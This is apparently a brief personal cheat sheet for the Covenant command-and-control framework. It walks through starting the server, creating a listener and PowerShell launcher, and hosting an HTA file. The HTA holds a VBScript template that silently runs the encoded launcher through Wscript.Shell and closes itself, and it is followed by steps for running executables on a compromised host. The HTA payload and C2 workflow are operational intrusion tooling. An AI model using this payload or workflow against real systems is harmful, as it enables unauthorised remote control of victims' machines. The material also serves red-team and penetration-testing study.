## Covenant C2 Framework
- https://github.com/cobbr/Covenant

### Installation
- https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### General
#### Start Covenant
```
/opt/Covenant/Covenant > dotnet run
```

#### Create a listener
- https://github.com/cobbr/Covenant/wiki/Listeners
- Give it a name and ConnectAdress the adress to Connect to

#### Create a launcher (For example PowerShell)
- Select a listener
- Click on Host and create a different url, for example ```\HTTPStager.ps1``` and click on Host!
- Copy the Launcher and Encoded Launcher codes

#### HTA script
- Use the command in the following HTA file
```
<script language="VBScript">
Function DoStuff()
Dim wsh
Set wsh = CreateObject("Wscript.Shell") 
wsh.run "[YOUR ENCODED LAUNCHER]" 
Set wsh = Nothing
End Function 
DoStuff
self.close 
</script>
```

#### Go back to listener and upload the HTA file

### Run executables on target
- Interact with the grunt.
- Go to tasks, select Assembly, select executable and run!
- Was only able to run Watson, not others.
